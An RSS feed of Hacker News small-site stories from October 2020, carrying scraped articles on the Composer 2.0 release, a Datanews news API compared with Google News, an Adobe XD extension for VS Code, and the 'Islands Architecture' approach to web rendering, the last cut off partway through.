<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Mon, 26 Oct 2020 12:38:27 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Mon, 26 Oct 2020 12:38:27 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Composer 2.0 is now available]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24878068">thread link</a>) | @Y-bar
<br/>
October 24, 2020 | https://blog.packagist.com/composer-2-0-is-now-available/ | <a href="https://web.archive.org/web/*/https://blog.packagist.com/composer-2-0-is-now-available/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <h2 id="1-what-s-new">1/ What's new?</h2><p>The list of changes and improvements is long, check the <a href="https://github.com/composer/composer/releases/tag/2.0.0">complete changelog</a> if you are interested in reading it all. I will highlight a few key points here.</p><h3 id="performance-improvements">Performance improvements</h3><p>We overhauled pretty much everything from the protocol used between Composer and packagist.org to the dependency resolution, including downloading files in parallel using curl and constraint evaluation optimizations. This leads to massive improvements in terms of both speed and memory usage. The difference depends on your use case, so while I've seen reports of improvements of over 50% to both in some projects, I cannot put an exact number on it. But I am sure you will be positively surprised if you haven't tried Composer 2 yet.</p><p>As a side note to this, <code>require</code>/<code>remove</code> and partial updates are now much faster because Composer will now only load the metadata of the packages which are being changed.</p><figure><img src="https://blog.packagist.com/content/images/2020/10/image_2020-10-24_175318.png" alt="" srcset="https://blog.packagist.com/content/images/size/w600/2020/10/image_2020-10-24_175318.png 600w, https://blog.packagist.com/content/images/size/w1000/2020/10/image_2020-10-24_175318.png 1000w, https://blog.packagist.com/content/images/2020/10/image_2020-10-24_175318.png 1455w" sizes="(min-width: 1200px) 1200px"><figcaption>Time for initial update + install (bootstrapped project, empty cache) shows roughly 60% less time used by Composer 2 with ext-curl enabled</figcaption></figure><h3 id="architectural-changes-and-determinism">Architectural changes and determinism</h3><p>The way dependency updates are done internally was refactored, which, for you, will result in more deterministic updates. The current local state of the vendor directory will not interfere in updates anymore. </p><p>After an update is complete, the install process is run automatically and it will now execute all network bound operations first - and in parallel if possible. This will avoid leaving you with a half-updated vendor directory if a network error occurs midway through installation.</p><h3 id="runtime-features">Runtime features</h3><p>We added a <a href="https://getcomposer.org/doc/07-runtime.md#platform-check">platform-check step</a> when <code>vendor/autoload.php</code> gets initialized which checks the current PHP version/extensions match what is expected by your dependencies and fails hard otherwise.</p><p>There is a new class, <code>Composer\InstalledVersions</code>, which is autoloaded in every project and is available at runtime. It allows you to check which packages/versions are present at runtime of your own project.</p><p>See the <a href="https://getcomposer.org/doc/07-runtime.md">runtime docs</a> for more details.</p><p>If your code relies on any of these runtime features, you should require <code>"composer-runtime-api": "^2.0"</code> in your composer.json. This is a virtual package which is provided by Composer and will make sure people have to use Composer 2.x to install your package.</p><h3 id="error-reporting-improvements">Error reporting improvements</h3><p>Because things don't always go the way they're supposed to, we made sure to improve the error reporting shown to you when dependencies cannot be resolved. It's hard to give concrete examples here as there are a million ways this can fail but you will hopefully notice that messages are now shorter, clearer and less repetitive.</p><h3 id="partial-updates-with-temporary-constraints">Partial updates with temporary constraints</h3><p>Sometimes it can be useful to upgrade or downgrade a single package to a specific version, perhaps temporarily to test something or wait for a bug fix. You can now run <code>composer update vendor/package:1.0.*</code> for example (or <code>1.0.12</code> or any other version constraint), to run an update of only <code>vendor/package</code> to a version matching this additional constraint. This will not update your require in composer.json, and it will not mark the lock file out of date.</p><p>If you want to add/restrict a constraint but still do a full update of all dependencies, you can use <code>update --with vendor/package:1.0.*</code> which will run the update with that additional constraint.</p><h2 id="2-how-easy-is-it-to-upgrade">2/ How easy is it to upgrade?</h2><p>Our goal is that every Composer user can upgrade smoothly and swiftly. The gains are huge and we want everyone to benefit from them. To achieve that we did a few things:</p><ul><li>Composer 2.0 still supports PHP 5.3 and above, much like Composer 1.x</li><li><code>composer.lock</code> files are interoperable between versions, so you can upgrade to 2.0 and roll back easily if needed.</li><li>Most commands and arguments remain the same, and largely what you know about Composer remains true in 2.0.</li></ul><p>If you run <code>composer self-update</code> from 1.x, it will warn you that a new stable major version of Composer is available, and you can use <code>composer self-update --2</code> to migrate to it.</p><p>Should you encounter issues, you can go back at any time by using <code>composer self-update --1</code>. Hopefully that will make everyone feel comfortable to experiment with the new release.</p><p>If you are <a href="https://getcomposer.org/doc/faqs/how-to-install-composer-programmatically.md">installing Composer automatically</a> from the installer script, and wish to remain on Composer 1.x for the time being, you can also pass it a <code>--1</code> argument to prevent it from installing Composer 2.0 by default. If you do this please remember and aim to upgrade in a timely manner, as Composer 1.x will not be maintained for very long.</p><h2 id="3-backwards-compatibility-breaks">3/ Backwards compatibility breaks?</h2><p>Here are the main things likely to cause trouble with the upgrade process:</p><ul><li><strong>Plugins</strong>: This is probably going to be the major source of problems for most people. Plugins need to be updated to support Composer 2, and some of them are not ready, yet. Composer 2 will complain and fail to resolve dependencies if a plugin does not support it, so no need to overthink it, you can try it out and see how it goes.</li><li>The new <strong>platform-check feature</strong> means that Composer checks the runtime PHP version and available extensions to ensure they match the project dependencies. If a mismatch is found, the autoloader exits with error details to make sure problems are not overlooked. To avoid issues when deploying to production it is recommended to run <code>composer check-platform-reqs --no-dev</code> with the production PHP process as part of your build or deployment process.</li><li><strong>Repository priority</strong>: If a package exists in a higher priority repository, it will now be entirely ignored in lower priority repositories. If you seem to be missing packages when using Composer 2, see <a href="https://getcomposer.org/repoprio">repository priorities docs</a> for details.</li><li><strong>Invalid PSR-0 / PSR-4 configurations</strong> will not autoload anymore in optimized-autoloader mode, as per the warnings introduced in Composer 1.10. Mostly these warnings were for classes that were not meant to autoload anyway so I don't expect major issues, but it's safer to clean these up before upgrading.</li></ul><p>If you want to know more, I would highly recommend reading the <a href="https://github.com/composer/composer/blob/master/UPGRADE-2.0.md">UPGRADE</a> guide which has multiple sections for end users, plugin authors and Composer repository implementors.</p><h2 id="4-what-s-next">4/ What's next?</h2><p>We don't have a very detailed feature roadmap anymore as 2.0 contains tons of new goodies, but one important thing I want to explain is our PHP version support going forward.</p><p>As I mentioned above, Composer 2.0 supports PHP 5.3+, which is at this point very outdated and makes the code quite hard to maintain in places. We went through the effort to make sure every Composer user can upgrade to Composer 2, but the plan is to drop support for EOL PHP versions in a future minor release.</p><p>Composer 2.1 might still come with PHP 5.3 support, depending on the timeline and which features end up being included, but then at the latest by Composer 2.2 we will drop support for everything older than PHP 7.1.3. According to our stats this allows over 90% of the Composer users to use the latest version, and for the others who are stuck on outdated PHP versions we will keep providing critical bug and security fixes in the 2.0.x or 2.1.x range.</p><p>As for Composer 1.x, it is now more or less EOL. It will also receive critical fixes if anything comes up but the goal for everyone should be to migrate to 2.x as soon as possible.</p><p>Finally I want to thank everyone who contributed and helped make this a reality. The 2.0 release represents over 1100 commits from 28 people, 150+ GitHub issues and pull requests, plus everyone who test it, reviewed PRs, etc. It has been a huge effort with the first commits made about two years ago.</p><p>I also want to thank all our <a href="https://packagist.com/">Private Packagist</a> customers who helped finance this effort and afforded us the time we spent on all this. We sincerely hope everyone will appreciate the result!</p>
                </div>
            </section>


            


        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.packagist.com/composer-2-0-is-now-available/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24878068</guid>
            <pubDate>Sat, 24 Oct 2020 09:46:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google News API Alternative]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24877770">thread link</a>) | @caballeto
<br/>
October 24, 2020 | https://datanews.io/blog/google-news-alternative-2020 | <a href="https://web.archive.org/web/*/https://datanews.io/blog/google-news-alternative-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

    <!-- NAVBAR
    ================================================== -->
    <nav>
      <div>

        <!-- Brand -->
        <p><a href="https://datanews.io/">
          <img src="https://datanews.io/static/assets/img/logo-datanews-blue.png" alt="Datanews">
        </a></p><!-- Toggler -->
        <!-- Collapse -->
        

      </div>
    </nav>


    <!-- IMAGE
    ================================================== -->
    

    <!-- HEADER
    ================================================== -->
    <section>
      <div>
        <div>
          <div>

            <!-- Heading -->
            

            <!-- Text -->
            <p>
              In this article we will cover different approaches that may work as Google News API alternatives, starting with Google News itself, and then moving to a specialized News API provider.
            </p>

            <!-- Meta -->
            <div>
              <div>

                <!-- Avatar -->
                <p><img src="https://datanews.io/static/assets/img/photos/vladyslav_mokrousov.jpeg" alt="...">
                </p>

              </div>
              <div>

                <!-- Name -->
                <h6>
                  Vladyslav Mokrousov
                </h6>

                <!-- Date -->
                <p><time datetime="2020-10-19">
                  Published on October 19, 2020
                </time>

              </p></div>
            </div>

          </div>
        </div> <!-- / .row -->
      </div> <!-- / .container -->
    </section>

    <!-- SECTION
    ================================================== -->
    <section>
      <div>
        <div>
          <div>

            <!-- Fugure -->
            <figure>

              <!-- Image -->
              <img src="https://datanews.io/static/assets/img/brands/google-news-image.png" alt="...">

              <!-- Caption -->
              <figcaption>
                Google News Logo
              </figcaption>

            </figure>

          </div>
        </div> <!-- / .row -->
      </div> <!-- / .container -->
    </section>

    <!-- SECTION
    ================================================== -->
    <section>
      <div>
        <div>
          <div>

            <!-- Heading -->
            <h2>
              Google News overview.
            </h2>

            <!-- Text -->
            <p>
              <a href="https://news.google.com/">Google News</a> is a news aggregator service developed by <a href="https://en.wikipedia.org/wiki/Google">Google</a>. It presents an organized article flow from thousands of publishers and magazines. Having an audience of 280 million users, it is one of the most popular news aggregators in the world.
            </p>
            <p>
              It also provides personal news recommendations based on your past news browsing history. Google News has multi language support and is available in multiple regions across the world.
            </p>

          </div>
        </div> <!-- / .row -->
      </div> <!-- / .container -->
    </section>

    <!-- SECTION
    ================================================== -->
    <section>
      <div>
        <div>
          <div>

            <!-- Heading -->
            <h2>
              Use cases for News API.
            </h2>

            <!-- Text -->
            <p>
              News information is important for many different use cases from brand monitoring to trend discovery to financial news monitoring. Many companies rely on news monitoring to find new opportunities in the markets, including new clients.
            </p>
            <p>
              The most popular use cases include:
            </p>

            <!-- List -->
            <ul>
              <li>

                <!-- Check -->
                

                <!-- Text -->
                <p>
                  Keyword tracking: finding relevant articles with given keywords.
                </p>

              </li>
              <li>

                <!-- Check -->
                

                <!-- Text -->
                <p>
                  Data collection: collecting large amounts of news articles and applying it for analysis and ML models training.
                </p>
              </li>
              <li>

                <!-- Check -->
                

                <!-- Text -->
                <p>
                  Better engagement with authors: improving engagement with authors by collecting statistics about articles and topics they write about.
                </p>
              </li>
              <li>

                <!-- Check -->
                

                <!-- Text -->
                <p>
                  Financial news monitoring: news have outsized impact on the stock market. One who gets access to recent news first has a big advantage over the competitors.
                </p>
              </li>
            </ul>

            <p>
              Having the news data presented in a nice and convenient way will greatly simplify the implementation of solutions for the above problems.
            </p>
          </div>
        </div> <!-- / .row -->
      </div> <!-- / .container -->
    </section>

    <!-- SECTION
    ================================================== -->
    <section>
      <div>
        <div>
          <div>

            <!-- Heading -->
            <h2>
              Google News limitations.
            </h2>

            <!-- Text -->
            <p>
              For the most basic use cases <a href="https://news.google.com/">Google News</a> or <a href="https://www.google.com/alerts">Google Alerts</a> may be enough, but both of these services have many limitations that prevent them from being used on a bigger scale.
            </p>
            <p>
              Unfortunately Google News does not provide a convenient way to retrieve a big amount of relevant data, as it poses a strict limit on the number of articles that could be retrieved per query. Yet another concern is rate limiting restrictions. Google News is primarily focused on human users, not robots, therefore you risk getting your ip banned when trying to make a large amount of queries programmatically.
            </p>
            <p>
              The search interface is also far from perfect, as it does not allow building complex queries, in contrast to
              <a href="https://www.elastic.co/what-is/elasticsearch">modern full-text search storage solutions</a>, which provide a wide variety of operators for building search queries of almost any complexity.
            </p>
          </div>
        </div> <!-- / .row -->
      </div> <!-- / .container -->
    </section>

    <!-- SECTION
    ================================================== -->
    <section>
      <div>
        <div>
          <div>

            <!-- Heading -->
            <h2>
              Datanews API overview.
            </h2>

            <!-- Text -->
            <p>
              <a href="https://datanews.io/">Datanews API</a> is a simple and efficient <a href="https://en.wikipedia.org/wiki/JSON">JSON-based</a> HTTP REST API, designed and built to solve all of the above problems. It provides convenient programmatic access to tens millions of news articles, including recent and historical data.
            </p>
            <p>
              Our News API collects news articles in <span>real-time</span> from thousands of newspapers, media outlets, news aggregators and other websites, and then presents them in a convenient
              <a href="https://en.wikipedia.org/wiki/JSON"></a>JSON representation, which could be consumed right away in any programming language.
            </p>
          </div>
        </div> <!-- / .row -->
      </div> <!-- / .container -->
    </section>

    <!-- SECTION
    ================================================== -->
    <section>
      <div>
        <div>
          <div>

            <!-- Heading -->
            <h2>
              Google News and Datanews API side-by-side comparison.
            </h2>

            <!-- Text -->
            <p>
              Let’s go over the main features and make a side-by-side comparison with Google News.
            </p>

            <ul>
              <li>

                <!-- Text -->
                <h3>
                  Maximum number of articles returned per query.
                </h3>

                <ul>
                  <li>
                    Google News has a max limit of <span>100</span> articles per query without any possibility to retrieve more. This may be a big limitation if the search keyword is very popular and may contain thousands or even tens of thousands of relevant articles.
                  </li>
                  <li>
                    In contrast, Datanews News API provides access to <span>all of the relevant articles whenever they were published</span>. The API uses
                    <a href="https://en.wikipedia.org/wiki/Pagination">pagination</a> for efficient transfer of a large amount of articles through the network.
                  </li>
                </ul>
              </li>

              <li>

                <!-- Text -->
                <h3>
                  Available news article metadata.
                </h3>

                <ul>
                  <li>
                    Google News provides a limited amount of metadata about each particular article. It usually includes the publication date, description field, title and the original article link.
                  </li>
                  <li>
                    Datanews API returns more additional information about each article, which is directly extracted from webpage: original article link, title, description, publication date, domain of the publication, url of the image on the article page, <span>list of authors</span>, language, country, <span>snippet of the content</span>.
                  </li>
                </ul>

                <p>Above information is much more useful for use cases such as data collection or public relations. Analyzing authors of the articles on the large scale allows PR firms to work more efficiently, as they will have more context about authors and journalists.</p>
              </li>
              <li>

                <!-- Text -->
                <h3>
                  Rate limiting restrictions.
                </h3>

                <ul>
                  <li>
                    Google News has rate limiting restrictions violating which may result in your IP address being banned.
                  </li>
                  <li>
                    Datanews API has modest rate limiting restrictions, needed to make our system <span>secure and reliable</span> while being able to handle a large amount of requests.
                  </li>
                </ul>
              </li>
              <li>

                <!-- Text -->
                <h3>
                  Presence of easy programmatic access.
                </h3>

                <ul>
                  <li>
                    Google News has many <a href="https://github.com/DatanewsOrg/google-news-js">unofficial implementations of client libraries</a> for accessing it’s content. Although, none of them really goes past limitations mentioned above.</li>
                  <li>
                    As for the <a href="https://datanews.io/">Datanews</a>, we have developed special client libraries for several main programming languages to make it super simple to integrate News API into your solution. You can start using and testing the API in just several lines of code. See
                    <a href="https://datanews.io/docs">quickstart</a> page.
                  </li>
                </ul>
              </li>
              <li>

                <!-- Text -->
                <h3>
                  Pricing.
                </h3>

                <ul>
                  <li>
                    Google News is <span>free</span>, but comes with a set of limitations.
                  </li>
                  <li>
                    <a href="https://datanews.io/">Datanews</a> has <span>free</span> version for personal use, and paid versions for bigger production scale use cases.
                  </li>
                </ul>
              </li>
            </ul>
          </div>
        </div> <!-- / .row -->
      </div> <!-- / .container -->
    </section>

    <!-- SECTION
    ================================================== -->
    <section>
      <div>
        <div>
          <div>

            <!-- Heading -->
            <h2>
              Conclusion
            </h2>

            <!-- Text -->
            <p>
              Choosing between <a href="https://news.google.com/">Google News</a> and other News API is really about your use case. If you need something simple just for personal use, then going with Google News or Google Alerts will make perfect sense.
            </p>
            <p>
              Otherwise, if you plan to build some software system with bigger scale, then going with an existing news API provider like <a href="https://datanews.io/">Datanews</a> will make more sense. It will provide you with a reliable and complete news monitoring solution that is ready to be integrated into your product.
            </p>
          </div>
        </div> <!-- / .row -->
      </div> <!-- / .container -->
    </section>

    <!-- SECTION
    ================================================== -->
    <section>
      <div>
        <div>
          <div>

            <!-- Meta -->
            <div>
              <div>

                <!-- Avatar -->
                <p><img src="https://datanews.io/static/assets/img/photos/vladyslav_mokrousov.jpeg" alt="...">
                </p>

              </div>
              <div>

                <!-- Name -->
                <h6>
                  Vladyslav Mokrousov
                </h6>

                <!-- Date -->
                <p><time datetime="2020-10-19">
                  Published on October 19, 2020
                </time>

              </p></div>
            </div>
          </div>
        </div> <!-- / .row -->
      </div> <!-- / .container -->
    </section>

    <!-- SHAPE
    ================================================== -->
    

    <!-- CTA
    ================================================== -->
    <section>
      <div>
        <div>
          <div>

            <!-- Heading -->
            <h3>
              Get our stories delivered
            </h3>

            <!-- Text -->
            <p>
              From us to your …</p></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://datanews.io/blog/google-news-alternative-2020">https://datanews.io/blog/google-news-alternative-2020</a></em></p>]]>
            </description>
            <link>https://datanews.io/blog/google-news-alternative-2020</link>
            <guid isPermaLink="false">hacker-news-small-sites-24877770</guid>
            <pubDate>Sat, 24 Oct 2020 08:29:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Adobe XD for Visual Studio Code]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24877635">thread link</a>) | @soheilpro
<br/>
October 24, 2020 | https://letsxd.com/vscode | <a href="https://web.archive.org/web/*/https://letsxd.com/vscode">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="canvas">

      
  
  



    <header id="header">
      <div id="logo" data-content-field="site-title">
        
        
        <p>Learn and Master Adobe XD</p>
        
      </div>
      
      

    </header>

    

    

    <section id="page" role="main" data-content-field="main-content">
      <!-- CATEGORY NAV -->
      
      <div data-type="page" data-updated-on="1603395746578" id="page-5f8478feb0d88521445cc43b"><div><div><div data-block-type="23" id="block-f046bea312ce9fa939dd"><div>
<div id="featureHeader">
  <p><img src="http://letsxd.com/assets/vscode-dsp-xd.svg">
  </p>
  <div>
    
    <p>
Create and consume Design System Packages
      </p>
    </div>
</div></div></div><div data-block-json="{&quot;blockAnimation&quot;:&quot;none&quot;,&quot;layout&quot;:&quot;caption-hidden&quot;,&quot;overlay&quot;:true,&quot;description&quot;:{&quot;html&quot;:&quot;&quot;},&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;customThumb&quot;:&quot;5f8ba3d3459ade460ae76475&quot;,&quot;html&quot;:&quot;<iframe width=\&quot;560\&quot; height=\&quot;315\&quot; src=\&quot;https://www.youtube.com/embed/q6cx3t1P0cE\&quot; frameborder=\&quot;0\&quot; allow=\&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\&quot; allowfullscreen></iframe>&quot;,&quot;resolvedBy&quot;:&quot;manual&quot;}" data-block-type="32" id="block-yui_3_17_2_1_1602888907948_21308"><div><div data-html="<iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/q6cx3t1P0cE&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen></iframe>" data-provider-name=""><div><p><img data-src="https://images.squarespace-cdn.com/content/v1/5c7300cdc46f6d147ea52314/1602986963948-RSKFQVSOGGCLL998PA3H/ke17ZwdGBToddI8pDm48kFwudcIaueA2IuFc97yeD-gUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2dpRacYtyosja3bbfsBTfgF_lXZnsxpGu9F8UUjUNODvOCjLISwBs8eEdxAxTptZAUg/vs-code-header-image.png" data-load="false" data-image-focal-point="0.5,0.5" src="https://images.squarespace-cdn.com/content/v1/5c7300cdc46f6d147ea52314/1602986963948-RSKFQVSOGGCLL998PA3H/ke17ZwdGBToddI8pDm48kFwudcIaueA2IuFc97yeD-gUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2dpRacYtyosja3bbfsBTfgF_lXZnsxpGu9F8UUjUNODvOCjLISwBs8eEdxAxTptZAUg/vs-code-header-image.png"></p></div></div></div></div><div data-block-type="2" id="block-5038eb3461716b9973be"><p>Design systems are the link between Design and Development. To build a successful, tailored, and widely-adopted system, both designers and developers need to have a seat at the table. The new <a href="http://www.adobe.com/go/xd_vscode_marketplace">Adobe XD extension for Visual Studio Code</a> allows developers to visually map design sources, created in XD and available in Creative Cloud Libraries, to platform-specific code using design tokens. DesignOps teams will be able to create shareable <a href="https://github.com/AdobeXD/design-system-package-dsp">Design System Packages (DSPs)</a> that contain all the information developers need to consume while coding, including code snippets and documentation.</p></div><div><div><div data-block-type="2" id="block-c9bde2e8a583841e3bdd"><div><h3><strong>Getting Started with Design Tokens</strong></h3><p>Understand what design tokens are, what they do, and how they get compiled to platform-specific code.</p></div></div></div></div><div><div><div data-block-type="2" id="block-e2b8393ff5de55b8b9c3"><div><h3><strong>Consuming a Design System Package (DSP) in VS Code</strong></h3><p>Learn how to load DSPs to build apps and websites, accessing documentation, design tokens, and code snippets, without ever leaving Visual Studio Code.</p></div></div></div></div><div><div><div data-block-type="2" id="block-68d7680d106ff8f7969c"><div><h3><strong>Design System Packages (DSP) Importing Assets from Libraries</strong></h3><p>Create and manage your DSPs, visually. And if you import from Creative Cloud Libraries, you get colors, character styles, and XD components, in seconds.</p></div></div></div></div><div data-block-type="23" id="block-yui_3_17_2_1_1602641790534_14671"><div>

<h2>
  Publicly available DSPs &amp; Tools
</h2>
<div>
  <div>
    <p><img src="https://letsxd.com/assets/dsp/dsp-spectrum.jpg"></p><div>
    <h3>
      Adobe Spectrum DSP
    </h3>
    <p>
      Adobe's design system package, including React Spectrum code snippets.
    </p>
      </div>
      
  </div>
  <div>
    <p><img src="https://letsxd.com/assets/dsp/dsp-streamline.jpg"></p><div>
    <h3>
Streamline Icons DSP
    </h3>
    <p>
      1,285 essential icons for interfaces.
    </p>
      </div>
            
  </div>
  <div>
    <p><img src="https://letsxd.com/assets/dsp/dsp-bootstrap.jpg"></p><div>
    <h3>
Bootstrap 5 DSP
    </h3>
    <p>
Components and code snippets for the latest Bootstrap library, created by Foxbox Digital.
    </p>
      </div>
            
  </div>
  <div>
    <p><img src="https://letsxd.com/assets/dsp/dsp-material-design.jpg"></p><div>
    <h3>
Material Design DSP
    </h3>
    <p>
Coming soon a DSP for Material Design, including tokens and components.
    </p>
      </div>
            
  </div>
  
  <div>
    <p><img src="https://letsxd.com/assets/dsp/dsp-dracula.jpg"></p><div>
    <h3>
Dracula UI DSP
    </h3>
    <p>
Beautiful DSPs from the popular dark-mode-first color theme.
    </p>
      </div>
            
  </div>
  
  <div>
    <p><img src="https://letsxd.com/assets/dsp/dsp-reader.jpg"></p><div>
    <h3>
DSP Reader for XD    </h3>
    <p>
External plugin to allow designers to load DSPs in Adobe XD.    </p>
      </div>
            
  </div>
  
  <div>
    <p><img src="https://letsxd.com/assets/dsp/dsp-knapsack.png"></p><div>
    <h3>
Knapsack
    </h3>
    <p>
SaaS platform for unifying and managing your system with open-source export to DSP.
    </p>
      </div>
            
  </div>
  
  <div>
    <p><img src="https://letsxd.com/assets/dsp/dsp-specify.jpg"></p><div>
    <h3>
Specify
    </h3>
    <p>
Generate and distribute DSPs—automatically.
    </p>
      </div>
            
  </div>
  
</div></div></div></div></div></div>
    </section>

    

    

    

  </div></div>]]>
            </description>
            <link>https://letsxd.com/vscode</link>
            <guid isPermaLink="false">hacker-news-small-sites-24877635</guid>
            <pubDate>Sat, 24 Oct 2020 07:45:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Islands Architecture]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24877125">thread link</a>) | @jacobr
<br/>
October 23, 2020 | https://jasonformat.com/islands-architecture/ | <a href="https://web.archive.org/web/*/https://jasonformat.com/islands-architecture/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>

        

        <section>
            <p><img src="https://res.cloudinary.com/wedding-website/image/upload/c_scale,w_2400/v1597095361/krzysztof-grech-6orUY98fw9s-unsplash_r6wjnf.jpg"></p>



<p>I’ve struggled to find references to this online, but heard the name used multiple times this year when describing the approach outlined here.</p>

<p>The general idea of an “Islands” architecture is deceptively simple: render HTML pages on the server, and inject placeholders or slots around highly dynamic regions. These placeholders/slots contain the server-rendered HTML output from their corresponding widget. They denote regions that can then be "hydrated" on the client into small self-contained widgets, reusing their server-rendered initial HTML.</p>

<p>You can think of this like a static HTML document that contains multiple separate embedded applications:</p>

<p>  
<img width="600" src="https://res.cloudinary.com/wedding-website/image/upload/v1596766231/islands-architecture-1.png">  
</p>

<p>This may seem similar to "micro-frontends" at first glance. Both approaches share the idea of breaking applications up into independent units, however "micro-frontends" do not typically imply that composition of those units is achieved using HTML.</p>

<p>A closer analog to the "islands" approach would be progressive enhancement, to which we're essentially adding SSR hydration and a consistent metaphor for adding interactivity to a region of the page. In traditional progressive enhancement, we might have a <code>&lt;script&gt;</code> that looks for an image carousel in the page and instantiates a jQuery plugin on it. Instead, that image carousel would be rendered on the server and a dedicated <code>&lt;script&gt;</code> emitted for it that loads the image carousel implementation and in-place upgrades it to be interactive.</p>

<h3 id="whydoesthismatter">Why does this matter?</h3>

<p>As it turns out, there are a number of benefits to the group of approaches described here when compared to typical Single Page Application architectures.</p>

<h5 id="progressivehydrationforfree">"Progressive Hydration" for free</h5>

<p>I’ve touted the performance benefits of <a href="https://www.youtube.com/watch?v=k-A2VfuUROg">Progressive Hydration</a> techniques for frameworks like React, Angular, Preact and Vue. With these architectures, individual widgets on a page are loaded and initialized over time. This can be done using a simple scheduling approach via requestIdleCallback, or can take additional factors into account like viewport visibility, interaction likelihood, product value, etc.</p>

<p>Similar to Progressive Hydration, rendering pages using an islands architecture results in the heavier dynamic portions of the page being initialized not just progressively, but <em>separately</em>. This means individual regions of the page become interactive without anything else on the page needing to be loaded first.</p>

<p>Unlike Progressive Hydration, the approaches that fall out of building around an islands architecture do not require top-down rendering. This is a distinct advantage, since there are no outer “root” components that must be initialized before their descendants. Each part of the page is an isolated unit, and a performance issue in one unit doesn't affect the others.</p>

<h5 id="seoanduxarentatradeoff">SEO and UX aren’t a tradeoff</h5>

<p>The status quo for SSR as used by Single Page Applications is that it’s often cited as a necessity for SEO reasons. However, SSR can actually have a net <em>negative</em> impact on User Experience - visitors are left waiting for the actual functionality of a page to arrive while staring at a frustratingly fake version of that page.</p>

<p>Many applications also suffer from silent SSR performance pitfalls without realizing it. In virtual DOM libraries, it's easy (and common) to accidentally construct a situation where first render destroys the server-rendered HTML DOM, only to recreate it again from scratch (often synchronously). This is the result of some common misconceptions, which may stem from documentation giving an idealized view of hydration while passing over tricky caveats and footguns.</p>

<p>Even in cases where SSR hydration is functioning as designed, the status quo leaves a lot to be desired. The amount of JavaScript work being performed during page load is still many orders of magnitude more than what might be considered "efficient".</p>

<figure>  
<img width="500" src="https://res.cloudinary.com/wedding-website/image/upload/c_scale,w_1000/v1597095374/dave-hoefler-NYVc84Gh78I-unsplash_oqyquc.jpg">  
<figcaption><a href="https://unsplash.com/photos/NYVc84Gh78I" target="_blank">Photo by Dave Hoefler</a></figcaption>  
</figure>

<p>In an "islands" model, server rendering is not a bolt-on optimization aimed at improving SEO or UX. Instead, it is a fundamental part of how pages are delivered to the browser. The HTML returned in response to navigation contains a meaningful and immediately renderable representation of the content the user requested.</p>

<p>Sections of that HTML may be missing their client-side interactivity, but the document should at least contain the most essential content. For example: a news page’s HTML would contain the article body, and a product page would contain that product’s description.</p>

<p>All of the other content is secondary to this information, and its inclusion in the HTML becomes a product decision. How vital is this bit of information to a user visiting the page? How important is that widget to the business model? A "buy now" button that directly relates to revenue should be easily prioritized over a site feedback survey button that relates to information gathering.</p>

<h5 id="betterforaccessibilityanddiscoverability">Better for accessibility and discoverability</h5>

<p>A website that uses standard HTML links for navigation is easier for assistive technologies and web crawlers to use. This is true regardless of whether links or forms are intercepted by JavaScript and rerouted to client-side logic, because the underlying assumptions remain true: clicking a link navigates to the given page.</p>

<p>Anecdotally, think of the number of times you’ve been sent a “link” to what the sender assumed was the page they were viewing, only to realize the link contained none of the necessary information:</p>

<p>  
<img width="350" src="https://res.cloudinary.com/wedding-website/image/upload/v1596766231/islands-architecture-3.png">  
</p>

<p>Building page-based applications doesn't completely prevent these types of strange experiences, it only makes the decision to do so more direct. It makes the default outcome the accessible one.</p>

<hr>

<p>When it comes down to it, shipping an architecture that requires less code to do something is the type of long-term benefit your future self (or coworkers) will thank you for. It's possible — likely, even — that adopting a model like this requires more up-front design thinking. There are far few batteries-included options available for decomposing apps into independently deliverable widgets. Who knows, maybe we can fix that.</p>

<figure>  
<img src="https://res.cloudinary.com/wedding-website/image/upload/c_scale,w_2400/v1597095373/max-hermansson-3AsAVTBIw5I-unsplash_t7bmip.jpg">  
